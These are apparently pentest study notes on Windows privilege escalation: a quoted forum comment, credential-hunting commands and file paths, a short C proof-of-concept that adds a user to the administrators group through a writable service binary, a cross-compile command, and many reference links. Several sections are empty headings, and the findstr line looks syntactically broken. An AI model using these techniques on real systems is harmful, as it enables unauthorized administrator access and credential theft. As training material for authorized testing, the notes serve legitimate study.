# Privilege escalation windows


https://www.reddit.com/r/AskNetsec/comments/3ujqu3/best_windows_privilege_escalation_resources/
"Enumeration.
You don't always need to run some exploit to get higher privileges, just convince some service that is running as admin or SYSTEM to open nc.exe for you. Web services are often misconfigured and running as admin or system.
Also look at modifying a startup service to run nc.exe or your malicious binary. replace UPnP with your backdoor.
Source: OSCP and OSCE; Never used exploits to get privilege escalation on the windows machines in the lab or exam"

Look for vulnerable services that may be running as system

## Metasploit - The easy way

So if you have a metasploit meterpreter session going you can run **getsystem**.

## Manually

### Cleartext passwords

Can be find like this:
```
findstr /si password *.txt | *.xml | *.ini
```

Thse are common files to find them in. They might be base64-encoded. So look out for that. 

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

### Kernel exploits

Just as in windows kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. 

#### Python to binary

If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know.

### Misconfigurations

#### Incorrect file and service permissions

If you find a service that has read-write permissions set to everyone you can just change that binary into a binary that adds a user to the administrators'group and thereby giving it privileges.

Here is a POC code for this

```c
#include <stdlib.h>
int main ()
{
int i;
i=system ("net localgroup administrators theusername /add");
return 0;
}
```

We then compile it with out cross-compiler, if you are on linux, like this:

```
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
```


### Unquoted Service Paths

This attack is explained here:
http://toshellandback.com/2015/11/24/ms-priv-esc/

There is also a metasploit module for this is: exploit/windows/local/trusted_service_path


### Vulnerable Services

#### Service Binaries

#### Windows Services


### AlwaysInstallElevated

http://toshellandback.com/2015/11/24/ms-priv-esc/

### Unattended Installs


### Group Policy Preferences (GPP)

Most recommended article
http://www.fuzzysecurity.com/tutorials/16.html

https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html

https://github.com/gentilkiwi/mimikatz

http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html

https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be

https://www.youtube.com/watch?v=PC_iMqiuIRQ

http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/

https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

http://pwnwiki.io/#!privesc/windows/index.md